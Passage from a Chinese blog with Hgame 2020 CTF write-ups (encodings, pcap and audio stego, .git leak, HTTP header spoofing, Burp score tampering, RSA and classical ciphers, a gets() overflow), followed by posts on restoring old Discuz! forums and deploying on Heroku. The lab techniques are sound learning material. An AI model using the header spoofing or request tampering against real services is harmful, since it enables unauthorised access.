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一看结尾==，应该是base64编码，于是继续解密。 噫是个PNG图片。加上头补全 data:image/png;base64,。草（一种植物），真会玩，是个二维码。 （也可以base64解密后保存为二进制文件然后打开。 扫码得到flag： hgame{3Nc0dInG_@lL_iN_0Ne!} 真的会玩2333（（好，我也要整一个各种编码的嘻嘻嘻 Reference:https://www.qqxiuzi.cn/bianma/kaisamima.phphttps://www.splitbrain.org/services/ook 每日推荐得到一个.pcapng抓包文件，用Wireshark打开，查看http，发现应该是与wordpress博客相关。 利用“文件-导出对象-HTTP”，分析其中的对象。 结合题目提示 ObjectNotFound正听着网易云每日推荐… 发现了一个上传的网页—— 这是一个提交的表格，发现了上传的文件 song.zip，将其提取出来。 压缩包里果然是一首歌，且备注里提示是6位数字。 考虑到6位数字，直接就暴力破解好了。（其实还在抓包文件里找了老半天没找到（（（ 利用口令759371解压得到mp3文件。 一开始打开010editor找，没有。 foremost提取得到了封面图，也没有隐写。 看来在音频里了，猜想就是音频隐写嘛。 既然是MP3，先试试MP3StegoDecode，结果么得。 the bit stream file I Love Mondays.mp3 is a BINARY file HDR: s=FFF, id=1, l=1, ep=on, br=4, sf=3, pd=0, pr=0, m=0, js=0, c=0, o=0, e=0 alg.=MPEG-1, layer=I, tot bitrate=128, sfrq=0.0 mode=stereo, sblim=32, jsbd=32, ch=2 [Frame 3]OpenTable: could not find tables/huffdec Check local directory './tables/' Please check huffman table 'huffdec'上网找了一下，下了个音频处理软件Audacity。（免费开源跨平台，还不错 Free, open source, cross-platform audio software. Audacity is an easy-to-use, multi-track audio editor and recorder for Windows, Mac OS X, GNU/Linux… 查看频谱，得到flag： hgame{I_love_EDM233} Electronic Dance Music （电子舞曲）可还行。 第一次做音频隐写的题，哇脑洞真大，太有意思了233333 WebCosmos 的博客http://cosmos.hgame.n3ko.co/ 先在网页里找了半天没找到emmm 后来发现，既然说版本管理工具，还有GitHub嘛。 那就构造/.git/config试试 果然—— [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote \"origin\"] url = https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc fetch = +refs/heads/*:refs/remotes/origin/*好，这个GitHub仓库有戏！ 访问一波，然后在commit里找到了flag。 base64解码得到flag hgame{g1t_le@k_1s_danger0us_!!!!} /.git目录公开访问是挺危险的emmm 接 头 霸 王http://kyaru.hgame.n3ko.co/ 直接访问，提示 You need to come from https://vidar.club/. 增加请求头: Referer: https://vidar.club/，重发后提示 You need to visit it locally. 增加请求头：X-Forwarded-For: 127.0.0.1 You need to use Cosmos Brower to visit. 改UA：User-Agent: Cosmos The flag will be updated after 2077, please wait for it patiently. 根据响应头 Last-Modified: Fri, 01 Jan 2077 00:00:00 GMT，进行修改。把 If-Unmodified-Since 设置在 Last-Modified 之后就可以了。 增加请求头：If-Unmodified-Since: Fri, 01 Jan 2077 00:00:00 GMT 得到flag hgame{W0w!Your_heads_@re_s0_many!} 这题一波三折啊。 最后这个操作让我想到了ustc的hackgame里信息安全 2077那道题，然后回去看了一下233. Reference： https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8_2077/README.md 🐔尼泰玫cxk有点好玩2333 随便玩了一下觉得有点无聊（x 看了一下网页源代码，发现是用canvas画布画出来的，交互用的js，有点意思i。 然后打开了Burp Suite，抓个包看看吧。 发现游戏结束的时候会POST当前得分。 不够则提示 Your score must more than 30000 , then you can get the flag. Happy game! 那就截包改包好了啦，直接给他加个0. 这就出来了呀！ ​ hgame{j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!} Code Worldhttp://codeworld.hgame.day-day.work/ 发现重定向到了 http://codeworld.hgame.day-day.work/new.php 同时看到了一句js console.log(\"This new site is building....But our stupid developer Cosmos did 302 jump to this page..F**k!\") curl看了一下之前的网页405。 嘤不会了。。 20200125更新： 看了官方WP，发现要把请求改成POST发到原页面。 于是试了一下，返回 人鸡验证 目前它只支持通过url提交参数来计算两个数的相加，参数为a 现在,需要让结果为10再构造参数a，根据提示参数a的提交格式为: 两数相加(a=b+c)，考虑到+的Urlencode为%2b 于是构造/?a=2%2b8，得到flag The result is: 10 hgame{C0d3_1s_s0_S@_sO_C0ol!} CryptoInfantRSA题目给了如下的代码—— #!/usr/bin/env python3 from secret import flag assert flag.startswith(b'hgame{') and flag.endswith(b'}') m = int.from_bytes(flag, byteorder='big') p = 681782737450022065655472455411 q = 675274897132088253519831953441 e = 13 c = pow(m, e, p*q) assert c == 275698465082361070145173688411496311542172902608559859019841 RSA啦。这里就根据密文C把明文M给找出来。 c = 275698465082361070145173688411496311542172902608559859019841 n = 460390767897997184102969941508880171690097589571068900519251 d = 141658697814768364339375366617699419709389378231351875726277 m = pow(c,d,n) # 得到m为39062110472669388914389428064087335236334831991333245 # 再将数字m转换为字符串 import binascii flag = binascii.unhexlify(hex(m)[2:]) 或者 用上面的工具里的Test： 得到flag： hgame{t3Xt6O0k_R5A!!!} Reference: 介绍RSA的https://www.freebuf.com/articles/others-articles/166049.htmlhttps://www.freebuf.com/articles/others-articles/161475.htmlhttps://www.k2zone.cn/?p=2157 Reordernc 47.98.192.231 25002 敲个回车就可以得到一个乱序的字符串，刚开始还以为是分组来着，然后试了半天不对emmm。 后来才发现，原来每次的结果都不一样233，比如下面是一些实验结果。 Rua!!! $hLjgp+ame{UI5mtA3}u_!iP!RmTn0eT Rua!!! $mtgIUeapjm{h+5LAeT_nTRP!u!m3i0} Rua!!! t5m{ag+eh$UjILmpT0!mP_iR3ATun}e! $mhmjI5te+{apUgLAe3!un0TRimP!T_} mat5jIpmg$heLU{+!PT0un!e_A3R}Tmi {LUpt5mI+e$mgajhm}T!T0!niRAe_Pu3 $Umm+g{LIe5jphtaAT!ei_m}nR0u!3TP 5I{eLmt+ha$mgpjU0nmR}eTi3PA!_!uT Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R既然是乱序吧，那就看看到底是什么个顺序好了！ 上面字符串的长度为32，于是构造字符串 str1='123456abcdefghijklmnopqrstuvwxyz' 输入后得到 str2='jhca1346ibdefg25zxsqkmnpyrtuvwlo' 试了发现该顺序不变，于是得到编码的对应关系（正变换逆变换嘛233333） str1='123456abcdefghijklmnopqrstuvwxyz' print(len(str1)) str2='jhca1346ibdefg25zxsqkmnpyrtuvwlo' # 正变换 location=list(range(len(str1))) for i in range(len(str2)): location[i]=str1.index(str2[i]) print(location) # [15, 13, 8, 6, 0, 2, 3, 5, 14, 7, 9, 10, 11, 12, 1, 4, 31, 29, 24, 22, 16, 18, 19, 21, 30, 23, 25, 26, 27, 28, 17, 20] # 逆变换 ilocation=list(range(len(str1))) for i in range(len(str2)): ilocation[i]=str2.index(str1[i]) print(ilocation) # [4, 14, 5, 6, 15, 7, 3, 9, 2, 10, 11, 12, 13, 1, 8, 0, 20, 30, 21, 22, 31, 23, 19, 25, 18, 26, 27, 28, 29, 17, 24, 16] # 验证结果 str3='' for i in location: str3+=str1[i] print(str3) # jhca1346ibdefg25zxsqkmnpyrtuvwlo 这里用到的是正变换，暴力破解一波吧！ str_encrypted = r'Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R' str_decrypted = '' for _ in range(80): for i in location: str_decrypted += str_encrypted[i] print(str_decrypted) str_encrypted = str_decrypted str_decrypted = '' 最开始试了50次没出来233，后来把数字改大了一点233. 终于跑出来了！ 得到flag： hgame{jU$t+5ImpL3_PeRmuTATi0n!!} 果然就排列呗23333 还试了一下，这个130次一循环来着emmm。就这样，发现range改到131就出现两个了。 str_encrypted = r'Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R' str_decrypted = '' for _ in range(130): for i in location: str_decrypted += str_encrypted[i] if str_decrypted.startswith('hgame'): print(str_decrypted) str_encrypted = str_decrypted str_decrypted = '' 不对唉！好像没这么简单。重新试了一下之前的几个Rua!!!之后的结果，发现这个变换不可行emmm。 必须是连续输入上一次出来的结果才行。（可能理解有误 Affine题目给了这段用来加密的代码，现在就想办法还原回去找flag吧。 #!/usr/bin/env python3 # -*- coding: utf-8 -*- import gmpy2 from secret import A, B, flag assert flag.startswith('hgame{') and flag.endswith('}') TABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM' MOD = len(TABLE) cipher = '' for b in flag: i = TABLE.find(b) if i == -1: cipher += b else: ii = (A*i + B) % MOD cipher += TABLE[ii] print(cipher) # A8I5z{xr1A_J7ha_vG_TpH410} 提示了flag以 hgame{ 开头，以 } 结尾，很明显能看出来{ } _这三个字符是找不到而直接加到cipher里的。 容易得到 MOD=62，于是乎思路就是，利用 hgame 与 A8I5z 的映射关系，把A和B两个参数给求解出来，再把参数i反解出来，最后把flag还原。 码代码吧。 TABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM' MOD = len(TABLE) # 62 flag = 'hgame' cipher = '' for b in flag: i = TABLE.find(b) print(b, i) # 求解得到对应的i # h 12 # g 11 # a 7 # m 6 # e 18 str_encrypt = r'A8I5z{xr1A_J7ha_vG_TpH410}' iis = list(range(5)) i = 0 for letter in str_encrypt[0:5]: iis[i] = TABLE.index(letter) print(letter, iis[i]) i += 1 # 求解得到对应的ii # A 46 # 8 33 # I 43 # 5 30 # z 0 得到了字母对应的i和ii，而i与ii满足关系 (A*i+B) % 62 = ii，从而可以把A、B解出来。 查了查模逆运算，看了看觉得有点麻烦emmm 猜想A、B不会太大，干脆直接遍历好了。。 for A in range(1, 62): for B in range(1, 62): if (12*A+B) % 62 == 46 and (11*A+B) % 62 == 33 and (7*A+B) % 62 == 43 and(6*A+B) % 62 == 30 and(18*A+B) % 62 == 0: print(\"Yes: \", A, B) # Yes: 13 14 得到A=13，B=14. 接下来还原flag。 # Begin to decrypt... A = 13 B = 14 str_encrypt = 'xr1AJ7havGTpH410' str_decrypt = '' for letter in str_encrypt: ii = TABLE.index(letter) for i in range(62): temp = (A*i + B) % 62 if temp == ii: print(i, TABLE[i]) str_decrypt += TABLE[i] print(str_decrypt) # M4thu5EdiNcRYpt0 # So the flag is `hgame{M4th_u5Ed_iN_cRYpt0}`. 这里先把_给去掉了，最后再加上。 于是乎flag就是： hgame{M4th_u5Ed_iN_cRYpt0} 看来果然是数学啊2333，还想看看大佬们怎么用数学方法解出来的。（（ 如题目所言—— Some basic modular arithmetic… Reference: 一点关于模逆运算的介绍，后面有空再看看吧（x https://blog.csdn.net/lion19930924/article/details/61926019 PwnHard_AAAAAnc 47.103.214.163 20000 IDA分析一波，发现是memcmp比较，backdoor函数里是执行/bin/sh的。 其中s与v5距离为 -31h-(-ACh)=123，构造payload发了个\"0O0o\"过去，发现么得。 int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+0h] [ebp-ACh] char v5; // [esp+7Bh] [ebp-31h] unsigned int v6; // [esp+A0h] [ebp-Ch] int *v7; // [esp+A4h] [ebp-8h] v7 = &amp;argc; v6 = __readgsdword(0x14u); alarm(8u); setbuf(_bss_start, 0); memset(&amp;s, 0, 0xA0u); puts(\"Let's 0O0o\\\\0O0!\"); gets(&amp;s); if ( !memcmp(\"0O0o\", &amp;v5, 7u) ) backdoor(); return 0; } 20200125更新： 看了官方WP，草（一种植物），好气啊，\\x00把字符串识别隔断了。 未完待续（可能会咕咕咕 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"2020/01/23/CTF_Hgame2020/"},{"title":"小想法 | 重建那些年基于Discuz!系统搭建的满是回忆的班级网站","text":"2020年第一篇哈，先祝大家新年快乐，每天都有新收获喵！ 哇呜！今天终于下了今年的第一场雪，贼惊喜~（然而积不起来啊嘤嘤嘤 前言 最近期末考试月忙死了，刚考完一科，难得有空来浪一下。考完一科浪两天然后作死复习的是我了emmm嘤嘤嘤。 有一次和奶冰冰聊天，回忆起之前折腾过的、搭建过的各种网站，而后就想到了N年以前搭建的班级网站。 （很明显，那时候提供网络服务的各种空间、域名什么的到现在没几个还能用的了。 2017年10月的时候，我的邮箱突然收到了一封来自Red Hat的邮件，提醒我OpenShift Online v2 End of Life了。↓ 那时候感觉特别惊喜，毕竟到那时已经放在那上面四五年了，我都差点忘记它的存在了。虽然域名早就炸了，但是这个免费的云平台居然还在（这个角度看来 Red Hat 还是挺可靠的233）。 那时就登上去看了一下，哇呜数据居然都还在，通过默认的域名还访问到了网站，于是好怀念啊，为了留个纪念就截了个图。 N年前先建了10班的班网论坛，（分班后）又建了个8班的班网。 ​ 几天之后，果不其然，Unavailable了。 不过还好那时候就有备份的好习惯（不是），试了几个密码登录进了8班的班网，然后把数据库给备份下来了，不过也只备份了数据库，附件啊头像啊这些就没备份下来。10班的班网（更是由于记不得密码了）就没成功备份emmm。 于是现在就觉得有点遗憾，通过phpMyAdmin其实可以直接导出数据库的；在重建的时候知道通过修改数据库可以把创始人密码修改的。 但那时候不大清楚这些，也有可能是那时连服务器密码都不记得了（（（ 最近这几天就想，干脆试一下，看看能不能重建那时候的班网吧。 重建折腾记辣鸡服务器配置出了一堆问题之前都没有自己动手在裸机上配置WEB环境来着，Linux也没有多少经验，于是乎上手就比较痛苦。 下面是一堆废话emmm 不想看就直接跳过这节吧。 租服务器的时候图省事直接装了PHPStudy，里面集成了LNMP环境，然后网站什么的直接可以在上面配置。 之前搭了几个测试用的网站，运行都没什么问题，能正常访问。 然而这次我建了一个新的PHP环境，打开端口，访问的时候居然报403无权限，但是其他的网站都没这个问题。 看到网页上是nginx报的错，很自然怀疑就是它的问题。检查了一下配置没发现问题，于是重装了一下。这回直接报500内部服务器错误了。（我愣住了 看了一下错误log，发现很多是无权限，还有的找不到文件？？？ 复制粘贴搜了一下，怀疑是动态链接库的问题，于是ln尝试创建链接，然而不成功。 然后不想管了，关闭nginx服务，启动apache服务，这回还是403，其他的网站就没问题，绝了。 换回nginx，将配置文件中的user由www更改为root，再试居然好了！看来果然是权限的问题，然而我之前好像并没有改过什么配置，也不清楚www用户为啥就没权限了。 root毕竟不太安全吧，于是又改了回去，403了。 登录服务器看了一下，几个网站目录下就只有新建的这个用户组是root，修改了目录权限，允许others执行，再访问，没问题了。 但很奇怪啊为啥就不行啊。 于是又重装了一次nginx，同时还卸掉了它的防火墙，这次没问题了emmm。再装回防火墙，又炸了。 WAF的问题啊。 这时候后台改参数也有报无权限的，就很懵逼。 于是干脆直接reboot好了。 （有句话说得好，重启解决绝大部分问题 进入后台，先关闭nginx，重装WAF，再开启nginx。这回终于没毛病了。（x 重建8班班网重建其实类似于搬家，于是看了几篇关于Discuz!搬家的教程，发现距今都有一段历史了。 去官方论坛找到了最新的X3.4版本的下载链接，发现指向了gitee，刚开始还觉得有点意思，然而当我点开链接发现连接不上gitee服务器，难道炸了？？？换了一个网络，连上了。（吐槽一下辣鸡宽带，估计是DNS出了点问题8 啊不是！！！ 别想着啥都想装最新的，得先考虑你要重建/恢复的系统是什么版本的啊！还要注意PHP的版本，以及语言编码（GBK/UTF8/BIG5/？）（就因为这个删掉又重建了好几个版本 论坛的版本可以在你备份的数据库.sql文件头部注释里看到。（这个还是后面重建10班班网时才发现的 不要像我一样装了发现用不了嘤嘤嘤。 upload文件夹打包传到服务器上，解压，然后访问网站。 草怎么又403了。 检查了一下文件发现是root所属，原来是之前一直以root身份操作的问题，更改用户组为www，这回能正常访问了。 按照安装流程全新安装Discuz!系统。这里的数据库要自己提前建好，表前缀和你要重建的一致，一般就不用更改。 安装完成，访问主页是默认的界面。（略） 根据官方的搬家教程，把utility/restore.php文件上传到网站的data/目录下，再把要恢复的数据库整个目录也上传到data/下，然后通过网站域名/data/restore.php访问数据恢复页面。 然而这里我被自己的WAF给拦住了233。 开了白名单再导入，这时候过了一段时间报504了emmm。（我又懵了，难得让我见到了好多错误页面，我没事的嘤嘤嘤 重试，如旧，同时发现cpu是100%在跑的（唉性能果然不咋样。 搜了各种资料，把nginx的超时和PHP执行时间都改了，还是504… 看了一下.sql文件，干脆不用整个工具，直接导入mysql好了啦。 虽然期间还报了几个错，但还是导完了呢。 访问主页，哇好惊喜啊，之前的分类、帖子什么都回来了。 用原始的创始人账号登录后台，更新缓存。 这里也折腾了老半天，不是安装论坛系统时候创建的，而是重建的老用户。 毕竟整个数据库都改回去了嘛。 至于忘记密码，emmm后面再说。 再刷新主页，这回数据基本能正常访问了，页面配置也恢复到了之前的状态。 （如果有的话）恢复logo、favicon、attachment、avatar、plugin、template等。 这里由于之前只备份了logo，其他数据基本没备份（或者说我的硬盘里没备份）emmm，就么的办法了。 看了看上面的帖子，全是黑历史啊……（黑脸.png 用户数据都恢复了，理论上能用原来的信息进行登录。 然而图片什么的都没了，之前很多外链的图片、插件都失效了，其实问题也不大吧。 不过能重建了也总比没有要好呀！嘻嘻嘻。 毕竟这个版本有很多安全漏洞了，出于安全考虑，这里就不公开了啦。 重建10班班网上面说了云平台End of Life的时候没有备份这个数据的。 但是我找遍了硬盘，终于翻出了那时候备份的部分数据。 有了上面重建的经验，本以为就很轻松上手的，没想到还是遇到了一堆问题。 首先还是版本的问题。 本以为X3.2版本已经够老了，没想到这里最后一直回退到了X2版本（噗 鬼懂得我重建了多少次网站emmmm 期间有一次是PHP版本错了，毕竟之前的版本一般只支持5.x来着，然后我装了7.x。 有一次是MySQL数据库炸了，装完之后主页都打不开，直接报的database error。然后卸掉了数据库，换了老一点的版本，发现装好了永远启动不了。最后发现是之前卸载有残留，绝了。清了一遍残留重装，再重启服务就好了。 还有一次是Discuz版本装的X2.5，本来挺开心的，导完数据更新完缓存，点开帖子就报database error，说找不到某某记录吧。最后版本降到X2终于好了，估计是版本升级过程中修改了这部分数据库或操作数据库的代码吧。 还有每一次都遇到了.sql导不进数据库的问题，因为这个数据库更大了，即使改了nginx和PHP的配置，在网页上导入还是永远报504，最后是一边看着CPU状态，一边从后台导入的。前端报了504，CPU还在跑，虽然SQL还报过好几种错但最后还是导入完成了。。（我太难了 噢还有那个创始人密码忘了的问题。 查了一下资料，一个方案是尝试登录UC_Center，如果成功登录的话可以在里面更新创始人的密码，再用更新后的密码登录Discuz的管理后台就行了。（这里用的就是这个方案） 另一个方案是修改数据库里面的用户相关的表，先改成一个比较简单的密码（好像是MD5加密），登录进去再修改。这里没用试过就不说了啦。 重建完成之后访问主页。 草，原来这个是那时候更新版本前的最后一次备份emmm （看亚子是第四代，最后更新的是第五代了，看了半天才想起来） 找了一下发现部分附件和头像之类的也有备份（更古老的数据了）。于是又折腾了一会儿把能恢复的数据给恢复了。 于是乎最后重建出来的是2013年1月的备份了。 怎么说好呢，其实问题也不大吧，真·回忆啊！ 这个版本的安全漏洞更多了，同样就不公开了，看看就好了啦。 emmm下面这个是恢复不了的第五代版本（真就只有这张图了嘤嘤嘤）。 一些想法 Linux权限管理还是很严格的，这回体验到了，有空再研究研究。 选对合适的版本，不要总想着用最新的。 看了Discuz!系统之前的老版本，都是把GBK编码的版本放在前面，不过现在都是推荐安装UTF-8编码版本了。 包括其他很多地方基本上就UTF-8了，感觉也算是个趋势吧，毕竟是国际编码，通用性强嘛。 去Discuz!官方论坛看了看，感觉明显冷清了。包括在后台看插件应用市场，基本上就变成了商业化的交易了，就有点怀念N年前那时候社区还很活跃，有一堆免费的还互相分享来着。（不过也算是时代趋势吧233 其实还找到了以前可能折腾过的各种建站系统233。 然后就想到纸飞机了嘤嘤嘤。今天去看了一下，发现纸飞机还能访问i，只是论坛关闭了，个人空间和视频区还是开放的，而且版本是X3.4算是最新的大版本了。（不知道于老板是不是还维护过 写这篇blog的时候又去OpenShift看了一下，发现现在都升级到 V4.2 版本了。增加了很多现在很实用很热门的Serverless、 CI/CD之类的，现在的Starter plan也是免费的，不过感觉加了不少限制吧（毕竟减少滥用节约资源嘛）。感兴趣的还可以看看下面的链接。 版本介绍：https://blog.openshift.com/introducing-red-hat-openshift-4-2-developers-get-an-expanded-and-improved-toolbox/ 产品介绍：https://www.openshift.com/products/online/ ​ 备份是个好习惯，CTRL+S也是。 看了看之前的帖子，发现全都是黑历史…… 然后惊喜地发现，之前的外链难得有几个还能访问，进去一看发现是以前的教育博客，居然一直运营到了现在，而且以前的文章都在。全是回忆啊。。 等我有空再把上面以前发的文章爬下来备份一份23333. 有问题欢迎来交流哈哈哈。 溜了溜了喵 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"2020/01/09/Idea_RebuildClassWebsite/"},{"title":"NUAA_iCal_Web在线版本部署","text":"主要是简单记录一下Heroku的部署，毕竟一不小心就忘记该怎么折腾的了… （其实应该两周前写这篇blog的，现在已经忘了很多了嘤嘤嘤 Cause之前折腾了一两个月，做了个把课表导出到ical日历文件的小jio本，即 NUAA_ClassScheduleGitHub链接：click herehttps://github.com/miaotony/NUAA_ClassSchedule 其中有一个TODO是搭建一个web端，实现在线导出。 实际上，在教务系统加入验证码之前，已经和奶冰一起做了一个可以用的web端了，只不过只是简单测试还没公开啥的。 然而，这个验证码一加就麻烦了……之前做的登录显然就不成功了。 解决方案的话，在本地，是通过把验证码下载下来，PIL调用本地图片查看器来显示，进而在命令行里输入。 不过web端就有点麻烦了。 但怎么说好呢，不妨碍用同样的思路解决这一问题呢嘻嘻嘻。后面再说。 其实到写这篇blog为止还没弄清楚他验证码的具体机理。（等我考完试有空再折腾好了喵 不想往下看又想体验NUAA_iCal_Web在线版本的，点这里访问吧。 DeployHeroku简介偶尔有一天在转GitHub的时候，看到某个项目下有个网页端的界面，README里面也有个deploy with heroku之类的图标按钮。点进去看了看，然后再查了查资料。 Heroku is a platform as a service (PaaS) that enables developers to build, run, and operate applications entirely in the cloud. Heroku是一个支持多种编程语言的云平台即服务。在2010年被Salesforce.com收购。Heroku作为最开始的云平台之一，从2007年6月起开发，当时它仅支持Ruby，但后来增加了对Java、Node.js、Scala、Clojure、Python以及（未记录在正式文件上）PHP和Perl的支持。基础操作系统是Debian，在最新的堆栈则是基于Debian的Ubuntu。 好东西呀！ 发现heroku可以在一定程度上免费搭建网站，当然前提是要有一个wsgi接口之类的，大概意思就是说需要让你的东西能通过网络访问得到。 其实那时候我连wsgi是啥都不知道…… 官网链接：https://www.heroku.com/ 具体的定价策略参见这里。 Free版本的话，未认证用户每个月550小时免费动态时长，认证用户（好像是绑定银行卡）1000小时；30分钟无访问无活动的话会自己睡大觉，不会占用你的宝贵时长；提供二级域名，还可以自己绑米。 对于nuaaical来说，这个完全够用了呢！ 那就干脆折腾一下好了。 NUAA iCal Web端搭建需要一个wsgi接口之类的嘛，flask、django这些现成的就行。 本来就啥也不知道也没玩过，看来一下flask挺简单的，于是就简单学了一下flask框架。 然而真正搭建的过程中遇到了一堆奇妙的bug，本地跑着好好的，上了heroku就炸了。（这个不细说了 实际上代码就是从本地版本改的，毕竟在开发的时候留了很多现成的接口了，改一改调用一下函数之类的就完事了。 不过这个验证码折腾了老半天。 这里的策略是，当你访问页面的同时，后端去访问教务系统，把验证码图片爬下来送给前端，同时建立了一个与你有关的session。 当你post用户名密码及验证码后，后端利用同一个session去访问教务系统，进而爬取课表及考试信息，生成icalendar日历文件，而后以附件下载的形式构造response，从而得到属于你的ical课表。 当然，一定程度上安全一点，这个session在构造完response之后就销毁了，不保留在云平台上。 （这样其实还是没搞清楚验证码的机理，一定程度上相当于绕过了而已。 其实到这的话，本地搭建就结束了。 不过还考虑了一下复杂的生产环境…… 比如说登录信息重复post，而原来的验证码就不再有效了。 这里其实想了几种方案，但是行不通。最后干脆折腾了一波HTML，加了个前端界面，如果没登陆成功就提示一下，然后过一会儿返回主页好了。233 （有更好的方案欢迎提出喵！ 比如未登录情况下直接访问导出ical的页面 这个也是直接返回主页了。不过这里这个判断折腾了老半天。 最后的方案是在flask的session里建立了一个属于当前session的bool变量，默认为False，登录以后设置为True。 之前直接写在程序的全局变量里，本地跑着好好的，上云平台就炸了……再见。 还写过在flask的g变量里，后来仔细查了资料，g变量好像是只在当前页面请求中有效，意思就是作用范围不一样，于是否决了。 教务系统连接已重置 这个是他教务系统的问题啊，难顶了。还是折腾了老半天才发现这里的问题。 又改了改登录的延时，这回变成随机延时了，而且时间也加长了。 而且还把爬虫的UA改成了当前浏览器的UA。IP的话好像没办法了。 问题有所改善…然而偶尔还存在。 大不了多试几次就好了。 etc. 其实还有个打算是做个前端ifram框架之类的直接嵌套官方的登录界面，然后登录成功后再利用登录信息来爬取课表，这样一定程度上可能还更安全一点。再说吧…… Heroku搭建下面来简单记录一下Heroku的部署。 